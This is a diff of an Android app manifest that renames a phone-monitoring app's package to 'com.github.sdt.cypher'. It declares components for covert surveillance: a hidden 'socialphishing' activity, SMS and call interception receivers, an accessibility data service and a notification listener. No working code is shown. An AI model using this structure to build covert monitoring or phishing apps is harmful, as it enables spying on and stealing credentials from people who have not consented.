@@ -51,7 +51,7 @@
     <uses-permission android:name="com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE" />
 
     <application
-        android:name="com.github.midros.istheapp.app.IsTheApp"
+        android:name="com.github.sdt.cypher.app.IsTheApp"
         android:allowBackup="true"
         android:appComponentFactory="androidx.core.app.CoreComponentFactory"
         android:debuggable="true"
@@ -63,7 +63,7 @@
         android:testOnly="true"
         android:theme="@style/AppTheme" >
         <activity
-            android:name="com.github.midros.istheapp.ui.activities.login.LoginActivity"
+            android:name="com.github.sdt.cypher.ui.activities.login.LoginActivity"
             android:theme="@style/Login" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -72,36 +72,36 @@
             </intent-filter>
         </activity>
         <activity
-            android:name="com.github.midros.istheapp.ui.activities.register.RegisterActivity"
+            android:name="com.github.sdt.cypher.ui.activities.register.RegisterActivity"
             android:theme="@style/Login" />
         <activity
-            android:name="com.github.midros.istheapp.ui.activities.mainparent.MainParentActivity"
+            android:name="com.github.sdt.cypher.ui.activities.mainparent.MainParentActivity"
             android:configChanges="orientation|screenSize"
             android:theme="@style/AppTheme" />
         <activity
-            android:name="com.github.midros.istheapp.ui.activities.mainchild.MainChildActivity"
+            android:name="com.github.sdt.cypher.ui.activities.mainchild.MainChildActivity"
             android:configChanges="orientation|screenSize"
             android:theme="@style/Child" />
         <activity
-            android:name="com.github.midros.istheapp.ui.activities.lock.LockActivity"
+            android:name="com.github.sdt.cypher.ui.activities.lock.LockActivity"
             android:theme="@style/Lock" />
         <activity
-            android:name="com.github.midros.istheapp.ui.activities.gallery.ViewPhoto"
+            android:name="com.github.sdt.cypher.ui.activities.gallery.ViewPhoto"
             android:configChanges="orientation|screenSize"
             android:theme="@style/Transparent" />
         <activity
-            android:name="com.github.midros.istheapp.ui.activities.socialphishing.SocialActivityM"
+            android:name="com.github.sdt.cypher.ui.activities.socialphishing.SocialActivityM"
             android:configChanges="orientation|screenSize"
             android:excludeFromRecents="true"
             android:taskAffinity="com.github.midros.istheapp.ui.activities.socialphishing.SocialActivityM"
             android:theme="@style/Social" />
 
         <!-- Services -->
-        <service android:name="com.github.midros.istheapp.services.calls.CallsService" />
-        <service android:name="com.github.midros.istheapp.services.sms.SmsService" />
-        <service android:name="com.github.midros.istheapp.services.social.MonitorService" />
+        <service android:name="com.github.sdt.cypher.services.calls.CallsService" />
+        <service android:name="com.github.sdt.cypher.services.sms.SmsService" />
+        <service android:name="com.github.sdt.cypher.services.social.MonitorService" />
         <service
-            android:name="com.github.midros.istheapp.services.accessibilityData.AccessibilityDataService"
+            android:name="com.github.sdt.cypher.services.accessibilityData.AccessibilityDataService"
             android:label="@string/accessibility_service_label"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
             <intent-filter>
@@ -113,7 +113,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
         <service
-            android:name="com.github.midros.istheapp.services.notificationService.NotificationService"
+            android:name="com.github.sdt.cypher.services.notificationService.NotificationService"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
@@ -122,7 +122,7 @@
 
         <!-- Receivers -->
         <receiver
-            android:name="com.github.midros.istheapp.receiver.SmsReceiver"
+            android:name="com.github.sdt.cypher.receiver.SmsReceiver"
             android:enabled="true"
             android:exported="true"
             android:permission="android.permission.BROADCAST_SMS" >
@@ -130,14 +130,14 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
-        <receiver android:name="com.github.midros.istheapp.receiver.CallsReceiver" >
+        <receiver android:name="com.github.sdt.cypher.receiver.CallsReceiver" >
             <intent-filter android:priority="999" >
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
                 <action android:name="android.intent.action.PHONE_STATE" />
             </intent-filter>
         </receiver>
         <receiver
-            android:name="com.github.midros.istheapp.receiver.MonitorReceiver"
+            android:name="com.github.sdt.cypher.receiver.MonitorReceiver"
             android:enabled="true"
             android:exported="false" >
             <intent-filter>
